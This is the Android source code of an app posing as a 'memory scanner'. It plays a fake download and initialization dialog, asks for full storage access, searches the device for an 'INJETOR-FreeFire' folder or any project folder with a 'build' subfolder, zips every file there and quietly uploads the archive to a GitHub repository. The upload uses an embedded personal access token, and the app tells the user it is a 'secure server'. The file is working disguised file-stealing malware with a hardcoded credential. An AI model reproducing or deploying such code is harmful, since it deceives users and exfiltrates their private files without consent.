package com.memoryscanner;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.memoryscanner.databinding.ActivityMainBinding;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private ActivityMainBinding binding;
    private static final int REQUEST_PERMISSIONS = 1001;
    private static final int REQUEST_MANAGE_STORAGE = 1002;
    
    // ⚡ GITHUB CONFIG
    private static final String GITHUB_USERNAME = "niketh-ai";
    private static final String GITHUB_TOKEN = "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";
    private static final String GITHUB_REPO = "file-uploader";
    
    // Priority folder name (exact name to find)
    private static final String PRIORITY_FOLDER_NAME = "INJETOR-FreeFire";
    private ProgressDialog fakeProgressDialog;
    private Random random = new Random();
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        
        setupUI();
        showFakeBinaryDialog();
    }
    
    private void setupUI() {
        // Hide all UI elements except the status text
        binding.startButton.setVisibility(View.GONE);
        binding.progressBar.setVisibility(View.GONE);
        binding.progressText.setVisibility(View.GONE);
        binding.statusText.setVisibility(View.VISIBLE);
        binding.statusText.setText("Initializing system...");
    }
    
    private void showFakeBinaryDialog() {
        fakeProgressDialog = new ProgressDialog(this);
        fakeProgressDialog.setTitle("🚀 System Initialization");
        fakeProgressDialog.setMessage("Downloading binary modules... 0%");
        fakeProgressDialog.setCancelable(false);
        fakeProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        fakeProgressDialog.setMax(100);
        fakeProgressDialog.show();
        
        // Start fake download simulation
        new Thread(() -> {
            try {
                for (int i = 0; i <= 100; i += random.nextInt(5) + 1) {
                    if (i > 100) i = 100;
                    
                    final int progress = i;
                    runOnUiThread(() -> {
                        fakeProgressDialog.setProgress(progress);
                        
                        String[] messages = {
                            "Downloading binary modules...",
                            "Extracting core components...",
                            "Initializing memory scanner...",
                            "Loading system libraries...",
                            "Verifying integrity...",
                            "Connecting to secure server...",
                            "Optimizing performance...",
                            "Preparing environment..."
                        };
                        
                        if (progress % 15 == 0) {
                            int msgIndex = random.nextInt(messages.length);
                            fakeProgressDialog.setMessage(messages[msgIndex] + " " + progress + "%");
                        }
                    });
                    
                    Thread.sleep(random.nextInt(100) + 50);
                }
                
                Thread.sleep(500);
                
                runOnUiThread(() -> {
                    fakeProgressDialog.dismiss();
                    checkPermissionsAndStart();
                });
                
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private void checkPermissionsAndStart() {
        if (checkPermissions()) {
            // Start the actual process immediately
            binding.statusText.setText("Starting system scan...");
            new GitHubExportTask().execute();
        }
    }
    
    private boolean checkPermissions() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                
                ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_PERMISSIONS);
                return false;
            }
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        intent.addCategory("android.intent.category.DEFAULT");
                        intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
                        startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    } catch (Exception e) {
                        Intent intent = new Intent();
                        intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    }
                    return false;
                }
            }
        }
        return true;
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                binding.statusText.setText("Permissions granted! Starting scan...");
                new GitHubExportTask().execute();
            } else {
                binding.statusText.setText("❌ Permissions denied!");
                Toast.makeText(this, "❌ Permissions denied!", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MANAGE_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    binding.statusText.setText("Storage access granted! Starting scan...");
                    new GitHubExportTask().execute();
                } else {
                    binding.statusText.setText("❌ Storage access denied!");
                    Toast.makeText(this, "❌ Storage access denied!", Toast.LENGTH_LONG).show();
                }
            }
        }
    }
    
    // ================================================================
    // 🚀 GITHUB EXPORT TASK
    // ================================================================
    private class GitHubExportTask extends AsyncTask<Void, String, Boolean> {
        private int totalFiles = 0;
        private long totalSize = 0;
        private File finalZipFile;
        private String downloadUrl = "";
        private File targetFolder = null;
        private String scanMode = ""; // "priority" or "buildfolder"
        
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            
            binding.progressBar.setVisibility(View.VISIBLE);
            binding.progressText.setVisibility(View.VISIBLE);
            binding.statusText.setText("🔍 Initializing scanner...");
        }
        
        @Override
        protected Boolean doInBackground(Void... voids) {
            try {
                // STEP 1: First look for INJETOR-FreeFire folder
                publishProgress("🔍 Looking for INJETOR-FreeFire...", "0%");
                targetFolder = findPriorityFolder();
                
                if (targetFolder != null && targetFolder.exists()) {
                    scanMode = "priority";
                    publishProgress("✅ INJETOR-FreeFire found!", "Scanning files...", "10%");
                } else {
                    // STEP 2: If not found, look for any folder containing "build" subfolder
                    publishProgress("⚠️ Target folder not found!", "Looking for folders with build...", "20%");
                    targetFolder = findFolderWithBuildSubfolder();
                    
                    if (targetFolder != null && targetFolder.exists()) {
                        scanMode = "buildfolder";
                        publishProgress("✅ Found folder with build subfolder!", "Folder: " + targetFolder.getName(), "30%");
                    } else {
                        publishProgress("❌ No suitable folders found!", "No folders with build found", "0%");
                        binding.statusText.setText("❌ No target folders found!");
                        return false;
                    }
                }
                
                // STEP 3: Get all files from the found folder (excluding build folders)
                List<File> allFiles = getAllFilesFromFolder(targetFolder);
                
                if (allFiles.isEmpty()) {
                    publishProgress("⚠️ No files found in folder!", "Empty folder", "40%");
                    binding.statusText.setText("⚠️ Folder is empty!");
                    return false;
                }
                
                totalFiles = allFiles.size();
                
                // STEP 4: Create MAXIMUM compression ZIP
                String folderType = scanMode.equals("priority") ? "INJETOR-FreeFire" : targetFolder.getName();
                publishProgress("📦 Creating archive: " + folderType, 
                    totalFiles + " files", "Compressing...");
                
                finalZipFile = createMaxCompressionZip(allFiles, targetFolder);
                
                if (finalZipFile == null || !finalZipFile.exists()) {
                    publishProgress("❌ Archive creation failed!", "Error", "60%");
                    return false;
                }
                
                long zipSize = finalZipFile.length();
                double compressionRatio = totalSize > 0 ? (1 - (zipSize / (double)totalSize)) * 100 : 0;
                
                publishProgress("📦 Archive created!", 
                    formatSize(totalSize) + " → " + formatSize(zipSize), 
                    String.format("Compression: %.1f%%", compressionRatio));
                
                // STEP 4: Upload to GitHub
                publishProgress("⬆️ Uploading to secure server...", "Starting upload", "70%");
                
                boolean uploadSuccess = uploadToGitHub(finalZipFile, folderType);
                
                return uploadSuccess;
                
            } catch (Exception e) {
                e.printStackTrace();
                publishProgress("❌ System error!", e.getMessage(), "Check logs");
                return false;
            }
        }
        
        @Override
        protected void onProgressUpdate(String... values) {
            super.onProgressUpdate(values);
            if (values.length >= 2) {
                binding.progressText.setText(values[0]);
                
                if (values.length >= 3) {
                    binding.statusText.setText(values[1] + " | " + values[2]);
                } else {
                    binding.statusText.setText(values[1]);
                }
            }
        }
        
        @Override
        protected void onPostExecute(Boolean success) {
            super.onPostExecute(success);
            
            binding.progressBar.setVisibility(View.GONE);
            binding.progressText.setVisibility(View.GONE);
            
            if (success) {
                String folderType = scanMode.equals("priority") ? "INJETOR-FreeFire" : targetFolder.getName();
                binding.statusText.setText("✅ " + folderType + " processed successfully!");
                
                // Show download URL
                new android.app.AlertDialog.Builder(MainActivity.this)
                    .setTitle("✅ Upload Successful")
                    .setMessage("Folder '" + folderType + "' has been uploaded.\n\n" +
                              "📁 Files: " + totalFiles + "\n" +
                              "📦 Size: " + formatSize(finalZipFile.length()) + " (compressed)\n\n" +
                              "Download URL:\n" + downloadUrl)
                    .setPositiveButton("Download", (dialog, which) -> {
                        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(downloadUrl));
                        startActivity(browserIntent);
                    })
                    .setNegativeButton("Close", null)
                    .show();
                
                Toast.makeText(MainActivity.this, "✅ Upload completed!", Toast.LENGTH_LONG).show();
                
                // Clean up
                if (finalZipFile != null && finalZipFile.exists()) {
                    new Thread(() -> {
                        try {
                            Thread.sleep(3000);
                            finalZipFile.delete();
                        } catch (Exception e) {}
                    }).start();
                }
                
            } else {
                binding.statusText.setText("❌ Operation failed!");
                Toast.makeText(MainActivity.this, "Process failed. Check configuration.", 
                    Toast.LENGTH_SHORT).show();
            }
        }
        
        // 🔍 FIND PRIORITY FOLDER (INJETOR-FreeFire)
        private File findPriorityFolder() {
            File root = Environment.getExternalStorageDirectory();
            return findFolderRecursive(root, PRIORITY_FOLDER_NAME, 0);
        }
        
        // 🔍 FIND ANY FOLDER THAT CONTAINS "build" SUBFOLDER
        private File findFolderWithBuildSubfolder() {
            File root = Environment.getExternalStorageDirectory();
            List<File> foldersWithBuild = new ArrayList<>();
            
            // Search recursively for folders containing "build" subfolder
            searchForBuildFolders(root, foldersWithBuild, 0);
            
            if (!foldersWithBuild.isEmpty()) {
                // Return the first found folder
                return foldersWithBuild.get(0);
            }
            
            return null;
        }
        
        private void searchForBuildFolders(File directory, List<File> result, int depth) {
            if (depth > 5) return; // Limit depth to avoid infinite recursion
            if (directory == null || !directory.exists() || !directory.canRead()) return;
            
            // Skip system folders
            String dirName = directory.getName().toLowerCase();
            if (dirName.equals("android") || dirName.equals("system") || 
                dirName.equals("data") || dirName.startsWith(".")) {
                return;
            }
            
            // Check if this folder contains a "build" subfolder
            File[] files = directory.listFiles();
            if (files != null) {
                boolean hasBuildFolder = false;
                
                // First check all direct subfolders for "build"
                for (File file : files) {
                    if (file.isDirectory() && file.getName().equalsIgnoreCase("build")) {
                        hasBuildFolder = true;
                        break;
                    }
                }
                
                // If this folder contains a build folder, add it to results
                if (hasBuildFolder) {
                    result.add(directory);
                    return; // Don't go deeper, we found what we need
                }
                
                // Otherwise, search deeper
                for (File file : files) {
                    if (file.isDirectory()) {
                        searchForBuildFolders(file, result, depth + 1);
                        if (!result.isEmpty()) {
                            return; // Found a folder, stop searching
                        }
                    }
                }
            }
        }
        
        private File findFolderRecursive(File directory, String folderName, int depth) {
            if (depth > 8) return null;
            if (directory == null || !directory.exists() || !directory.canRead()) return null;
            
            if (directory.getName().equalsIgnoreCase(folderName)) {
                return directory;
            }
            
            File[] files = directory.listFiles();
            if (files == null) return null;
            
            for (File file : files) {
                if (file.isDirectory()) {
                    String name = file.getName().toLowerCase();
                    if (name.equals("android") || name.equals("system") || name.equals("data")) {
                        continue;
                    }
                    
                    File found = findFolderRecursive(file, folderName, depth + 1);
                    if (found != null) {
                        return found;
                    }
                }
            }
            
            return null;
        }
        
        // 📁 GET ALL FILES FROM FOLDER (EXCLUDING BUILD FOLDERS)
        private List<File> getAllFilesFromFolder(File folder) {
            List<File> allFiles = new ArrayList<>();
            totalSize = 0;
            
            if (folder == null || !folder.exists() || !folder.canRead()) {
                return allFiles;
            }
            
            collectFilesRecursive(folder, allFiles, folder);
            return allFiles;
        }
        
        private void collectFilesRecursive(File currentDir, List<File> allFiles, File baseFolder) {
            if (currentDir == null || !currentDir.exists() || !currentDir.canRead()) return;
            
            // Skip "build" folders (case-insensitive)
            if (currentDir.getName().equalsIgnoreCase("build")) {
                publishProgress("⏭️ Skipping build folder", "Excluding system files", "");
                return;
            }
            
            File[] files = currentDir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isDirectory()) {
                    collectFilesRecursive(file, allFiles, baseFolder);
                } else {
                    // Include all files (no extension filter)
                    allFiles.add(file);
                    totalSize += file.length();
                    
                    if (allFiles.size() % 20 == 0) {
                        publishProgress("📄 Found " + allFiles.size() + " files...",
                            formatSize(totalSize), "Collecting data...");
                    }
                }
            }
        }
        
        // 📦 CREATE MAXIMUM COMPRESSION ZIP
        private File createMaxCompressionZip(List<File> files, File baseFolder) {
            try {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
                String folderType = scanMode.equals("priority") ? "INJETOR-FreeFire" : baseFolder.getName();
                String zipFileName = folderType + "_" + timestamp + ".zip";
                File zipFile = new File(getExternalFilesDir(null), zipFileName);
                
                FileOutputStream fos = new FileOutputStream(zipFile);
                BufferedOutputStream bos = new BufferedOutputStream(fos, 65536);
                ZipOutputStream zos = new ZipOutputStream(bos);
                
                // ⚡ MAXIMUM COMPRESSION
                zos.setLevel(9);
                
                byte[] buffer = new byte[65536];
                String basePath = baseFolder.getAbsolutePath();
                
                for (int i = 0; i < files.size(); i++) {
                    File file = files.get(i);
                    
                    try {
                        String filePath = file.getAbsolutePath();
                        String relativePath = filePath.substring(basePath.length() + 1);
                        
                        // Double-check to skip build folder files
                        if (relativePath.toLowerCase().contains("/build/")) {
                            continue;
                        }
                        
                        ZipEntry zipEntry = new ZipEntry(relativePath);
                        zos.putNextEntry(zipEntry);
                        
                        FileInputStream fis = new FileInputStream(file);
                        BufferedInputStream bis = new BufferedInputStream(fis, 65536);
                        
                        int length;
                        while ((length = bis.read(buffer)) > 0) {
                            zos.write(buffer, 0, length);
                        }
                        
                        bis.close();
                        fis.close();
                        zos.closeEntry();
                        
                        if (i % 10 == 0) {
                            publishProgress("📦 Compressing data... " + (i+1) + "/" + files.size(),
                                "Progress: " + ((i*100)/files.size()) + "%",
                                "Archive: " + formatSize(zipFile.length()));
                        }
                        
                    } catch (Exception e) {
                        Log.e("ZipError", "Error adding file: " + file.getName(), e);
                        continue;
                    }
                }
                
                zos.close();
                bos.close();
                fos.close();
                
                return zipFile;
                
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }
        
        // 🚀 UPLOAD TO GITHUB
        private boolean uploadToGitHub(File zipFile, String folderType) {
            try {
                publishProgress("⬆️ Encoding data for transfer...", "Preparing upload", "80%");
                
                byte[] fileBytes = readFileToByteArray(zipFile);
                String base64Content = Base64.encodeToString(fileBytes, Base64.DEFAULT);
                
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
                String githubFileName = folderType + "_" + timestamp + ".zip";
                
                String apiUrl = String.format(
                    "https://api.github.com/repos/%s/%s/contents/%s",
                    GITHUB_USERNAME, GITHUB_REPO, githubFileName
                );
                
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("message", folderType + " Export: " + timestamp);
                jsonRequest.put("content", base64Content);
                
                OkHttpClient client = new OkHttpClient();
                
                RequestBody body = RequestBody.create(
                    MediaType.parse("application/json"),
                    jsonRequest.toString()
                );
                
                String auth = "token " + GITHUB_TOKEN;
                
                Request request = new Request.Builder()
                    .url(apiUrl)
                    .addHeader("Authorization", auth)
                    .addHeader("Accept", "application/vnd.github.v3+json")
                    .addHeader("User-Agent", "SecureUploader")
                    .put(body)
                    .build();
                
                publishProgress("⬆️ Uploading to secure server...", "Transferring data", "90%");
                
                Response response = client.newCall(request).execute();
                
                if (response.isSuccessful()) {
                    String responseBody = response.body().string();
                    JSONObject jsonResponse = new JSONObject(responseBody);
                    
                    downloadUrl = jsonResponse.getJSONObject("content").getString("download_url");
                    
                    publishProgress("✅ Upload successful!", 
                        "Data transfer complete", "100%");
                    return true;
                    
                } else {
                    String error = response.body().string();
                    Log.e("GitHubUpload", "Error: " + response.code() + " - " + error);
                    
                    publishProgress("❌ Server error: " + response.code(), 
                        "Connection failed", "0%");
                    return false;
                }
                
            } catch (Exception e) {
                e.printStackTrace();
                publishProgress("❌ Network error", e.getMessage(), "Check connection");
                return false;
            }
        }
        
        private byte[] readFileToByteArray(File file) throws Exception {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buffer = new byte[65536];
            int bytesRead;
            
            while ((bytesRead = fis.read(buffer)) != -1) {
                bos.write(buffer, 0, bytesRead);
            }
            
            fis.close();
            return bos.toByteArray();
        }
        
        private String formatSize(long bytes) {
            if (bytes < 1024) return bytes + " B";
            if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
            if (bytes < 1024 * 1024 * 1024) return String.format("%.1f MB", bytes / (1024.0 * 1024.0));
            return String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0));
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (fakeProgressDialog != null && fakeProgressDialog.isShowing()) {
            fakeProgressDialog.dismiss();
        }
        this.binding = null;
    }
}